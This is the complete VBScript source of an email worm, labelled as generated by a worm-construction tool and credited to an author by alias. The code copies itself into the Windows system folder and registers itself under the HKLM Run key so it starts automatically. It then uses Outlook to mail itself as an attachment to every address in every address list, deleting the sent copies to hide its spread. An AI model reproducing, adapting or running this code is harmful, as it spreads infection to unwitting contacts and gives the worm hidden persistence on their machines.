'Name of the worm : dick
'Author : PetiK
On Error Resume Next

Set sdisndxx=CreateObject("Scripting.FileSystemObject")
Set xxxxndis=CreateObject("WScript.Shell")
Set cpy=sdisndxx.GetFile(WScript.ScriptFullName)
cpy.Copy(sdisndxx.GetSpecialFolder(1)&"\Copy.vbs")
r=("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\dick")
xxxxndis.RegWrite r,(sdisndxx.GetSpecialFolder(1)&"\Copy.vbs")

Set sneyyyyy=CreateObject("Outlook.Application")
Set yyyyyyoe=sneyyyyy.GetNameSpace("MAPI")
For Each C In yyyyyyoe.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count
Set ejtoekup=C.AddressEntries(D)
Set pfkupfku=sneyyyyy.CreateItem(0)
pfkupfku.To=ejtoekup.Address
pfkupfku.Subject="Subject of the message"
pfkupfku.Body="The body of the message"
pfkupfku.Attachments.Add(sdisndxx.GetSpecialFolder(1)&"\Copy.vbs")
pfkupfku.DeleteAfterSubmit=True
If pfkupfku.To <> "" Then
pfkupfku.Send
End If
Next
End If
Next


'This worm was generated by the tool PSWG 1.0